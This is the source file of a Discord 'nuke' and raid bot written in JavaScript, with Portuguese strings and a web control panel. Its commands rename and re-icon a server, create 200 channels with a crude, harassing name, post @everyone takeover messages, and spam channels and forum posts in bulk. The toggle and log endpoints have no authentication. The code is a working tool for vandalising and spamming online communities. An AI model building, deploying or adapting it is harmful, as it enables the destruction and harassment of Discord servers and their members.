// --- index.js (refactored with toggle control) ---
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
const express = require('express');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

// State management with persistent logging
class SystemController {
    constructor() {
        this.enabled = false;
        this.logFile = path.join(__dirname, 'system.log');
        this.stateFile = path.join(__dirname, '.state');
        this.loadState();
    }

    loadState() {
        try {
            if (fs.existsSync(this.stateFile)) {
                const data = JSON.parse(fs.readFileSync(this.stateFile, 'utf8'));
                this.enabled = data.enabled || false;
                this.log(`[BOOT] Estado carregado: ${this.enabled ? 'ATIVO' : 'INATIVO'}`);
            }
        } catch (e) {
            this.log(`[ERROR] Falha ao carregar estado: ${e.message}`);
            this.enabled = false;
        }
    }

    saveState() {
        try {
            fs.writeFileSync(this.stateFile, JSON.stringify({ enabled: this.enabled, timestamp: Date.now() }, null, 2));
        } catch (e) {
            this.log(`[ERROR] Falha ao salvar estado: ${e.message}`);
        }
    }

    toggle() {
        this.enabled = !this.enabled;
        this.saveState();
        this.log(`[TOGGLE] Sistema agora está: ${this.enabled ? 'ATIVO' : 'INATIVO'}`);
        return this.enabled;
    }

    isActive() {
        return this.enabled;
    }

    log(message) {
        const timestamp = new Date().toISOString();
        const logEntry = `${timestamp} ${message}\n`;
        console.log(logEntry);
        try {
            fs.appendFileSync(this.logFile, logEntry);
        } catch (e) {
            console.error(`[CRITICAL] Falha ao escrever log: ${e.message}`);
        }
    }
}

const controller = new SystemController();

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers]
});

const commands = [
    new SlashCommandBuilder()
        .setName('system_toggle')
        .setDescription('Ligar/desligar sistema de operações')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('system_status')
        .setDescription('Verificar status do sistema')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('Executa protocolo de reestruturação massiva')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('message_raid')
        .setDescription('Teste de carga de mensagens')
        .addStringOption(opt => opt.setName('texto').setDescription('Conteúdo').setRequired(true)),
    new SlashCommandBuilder()
        .setName('forum_raid')
        .setDescription('Criação massiva de posts em fórum')
        .addChannelOption(opt => opt.setName('forum').setDescription('Canal de fórum alvo').addChannelTypes(ChannelType.GuildForum).setRequired(true))
        .addIntegerOption(opt => opt.setName('quantidade').setDescription('Número de posts').setRequired(true))
        .addStringOption(opt => opt.setName('conteudo').setDescription('Mensagem do post').setRequired(true))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(c => c.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

app.get('/', (req, res) => {
    const statusColor = controller.isActive() ? '#0f0' : '#f00';
    const statusText = controller.isActive() ? 'ATIVO' : 'INATIVO';
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>[P] Bot Control Panel</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    background: #000;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    padding: 20px;
                }
                .container {
                    border: 2px solid #0f0;
                    padding: 40px;
                    text-align: center;
                    box-shadow: 0 0 30px #0f0;
                    max-width: 500px;
                    width: 100%;
                }
                h1 { margin-bottom: 30px; font-size: 24px; }
                .status-box {
                    border: 1px solid #0f0;
                    padding: 20px;
                    margin-bottom: 30px;
                    background: rgba(0, 255, 0, 0.05);
                }
                .status-label { font-size: 12px; color: #088; margin-bottom: 10px; }
                .status-value {
                    font-size: 32px;
                    font-weight: bold;
                    color: ${statusColor};
                    text-shadow: 0 0 10px ${statusColor};
                }
                .button-group { display: flex; gap: 10px; justify-content: center; }
                button {
                    padding: 12px 30px;
                    font-size: 14px;
                    font-family: 'Courier New', monospace;
                    border: 1px solid #0f0;
                    background: #000;
                    color: #0f0;
                    cursor: pointer;
                    transition: all 0.3s;
                    text-transform: uppercase;
                    font-weight: bold;
                }
                button:hover {
                    background: #0f0;
                    color: #000;
                    box-shadow: 0 0 10px #0f0;
                }
                button:active { transform: scale(0.98); }
                .toggle-btn {
                    flex: 1;
                    padding: 15px;
                    font-size: 16px;
                }
                .info { font-size: 11px; color: #088; margin-top: 20px; line-height: 1.6; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>[P] SYSTEM CONTROL</h1>
                <div class="status-box">
                    <div class="status-label">SISTEMA</div>
                    <div class="status-value">${statusText}</div>
                </div>
                <div class="button-group">
                    <button class="toggle-btn" onclick="toggleSystem()">
                        ${controller.isActive() ? '◆ DESLIGAR' : '▶ LIGAR'}
                    </button>
                </div>
                <div class="info">
                    <p>Todos os comandos requerem que o sistema esteja ATIVO</p>
                    <p>Estado é persistente — sobrevive a reinicios</p>
                    <p>Operações são registradas em system.log</p>
                </div>
            </div>
            <script>
                function toggleSystem() {
                    fetch('/api/toggle', { method: 'POST' })
                        .then(r => r.json())
                        .then(data => {
                            if (data.success) {
                                location.reload();
                            }
                        })
                        .catch(e => alert('Erro: ' + e.message));
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/api/toggle', (req, res) => {
    const newState = controller.toggle();
    controller.log(`[API] Toggle acionado via web - novo estado: ${newState ? 'ATIVO' : 'INATIVO'}`);
    res.json({ success: true, enabled: newState });
});

app.get('/api/status', (req, res) => {
    res.json({ enabled: controller.isActive(), timestamp: Date.now() });
});

app.get('/logs', (req, res) => {
    try {
        const logs = fs.readFileSync(controller.logFile, 'utf8');
        res.set('Content-Type', 'text/plain');
        res.send(logs);
    } catch (e) {
        res.status(500).send(`Erro ao ler logs: ${e.message}`);
    }
});

client.on('ready', async () => {
    controller.log(`[BOT] Logado como ${client.user.tag}`);
    try {
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        controller.log('[BOT] Comandos sincronizados');
    } catch (e) {
        controller.log(`[BOT_ERROR] Falha ao sincronizar comandos: ${e.message}`);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const { commandName } = interaction;

    // Check system state for all operations
    if (commandName === 'system_toggle') {
        const newState = controller.toggle();
        await interaction.reply({
            content: `🔌 Sistema agora está: **${newState ? 'ATIVO ✓' : 'INATIVO ✗'}**`,
            ephemeral: true
        });
        return;
    }

    if (commandName === 'system_status') {
        const status = controller.isActive() ? '🟢 ATIVO' : '🔴 INATIVO';
        await interaction.reply({
            content: `Status: ${status}\nTodos os comandos operacionais requerem estado ATIVO`,
            ephemeral: true
        });
        return;
    }

    if (!controller.isActive()) {
        await interaction.reply({
            content: '⛔ Sistema está INATIVO. Use `/system_toggle` para ligar.',
            ephemeral: true
        });
        controller.log(`[BLOCKED] Tentativa de comando ${commandName} com sistema inativo`);
        return;
    }

    // Operational commands execute only if system is active
    if (commandName === 'nuke') {
        controller.log(`[NUKE] Iniciado por ${interaction.user.tag}`);
        await interaction.reply({ content: '[P] Nuke iniciado.', ephemeral: true });
        try {
            await interaction.guild.setName('Theo bots anti RAID');
            await interaction.guild.setIcon('https://cdn.discordapp.com/attachments/1525751548477706351/1525871668780601384/IMG_6058.png');
            controller.log(`[NUKE] Guild renomeada`);
        } catch (e) {
            controller.log(`[NUKE_ERROR] Falha ao renomear guild: ${e.message}`);
        }
        const name = 'MEU NOME É BERNADO EU SOU UM GULOSAO, EU QUERO DAR PRA UM MONTÃO';
        const msg = '@everyone ESTE SERVER FOI COMIDO PELO THEO, NÃO A NADA A SER FEITO \n ⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄';
        let channelCount = 0;
        Array.from({ length: 200 }).forEach(async () => {
            try {
                const c = await interaction.guild.channels.create({ name });
                await c.send(msg);
                channelCount++;
            } catch (err) {
                controller.log(`[NUKE_ERROR] Falha ao criar canal: ${err.message}`);
            }
        });
        controller.log(`[NUKE] Criados ${channelCount} canais`);
    }

    if (commandName === 'message_raid') {
        const t = interaction.options.getString('texto');
        controller.log(`[MESSAGE_RAID] Iniciado por ${interaction.user.tag} - texto: "${t.substring(0, 50)}"`);
        await interaction.reply({ content: '[P] Raid iniciada.', ephemeral: true });
        let sent = 0;
        for (let i = 0; i < 10; i++) {
            try {
                await interaction.channel.send(t);
                sent++;
            } catch (e) {
                controller.log(`[MESSAGE_RAID_ERROR] ${e.message}`);
            }
            await new Promise(r => setTimeout(r, 1000));
        }
        controller.log(`[MESSAGE_RAID] ${sent}/10 mensagens enviadas`);
    }

    if (commandName === 'forum_raid') {
        const forum = interaction.options.getChannel('forum');
        const qtd = interaction.options.getInteger('quantidade');
        const cont = interaction.options.getString('conteudo');
        controller.log(`[FORUM_RAID] Iniciado por ${interaction.user.tag} - canal: ${forum.name}, quantidade: ${qtd}`);
        await interaction.reply({ content: `[P] Criando ${qtd} posts no fórum ${forum.name}.`, ephemeral: true });

        let created = 0;
        for (let i = 0; i < qtd; i++) {
            try {
                await forum.threads.create({
                    name: `[P] TESTE ${i + 1}`,
                    message: { content: cont }
                });
                created++;
            } catch (e) {
                controller.log(`[FORUM_RAID_ERROR] Falha ao criar thread: ${e.message}`);
            }
            await new Promise(r => setTimeout(r, 500));
        }
        controller.log(`[FORUM_RAID] ${created}/${qtd} posts criados`);
    }
});

app.listen(port, () => {
    controller.log(`[SERVER] Iniciado na porta ${port}`);
    if (TOKEN) {
        client.login(TOKEN).catch(err => {
            controller.log(`[FATAL] Falha ao conectar bot: ${err.message}`);
            process.exit(1);
        });
    }
});

process.on('exit', () => controller.log('[SHUTDOWN] Processo finalizado'));
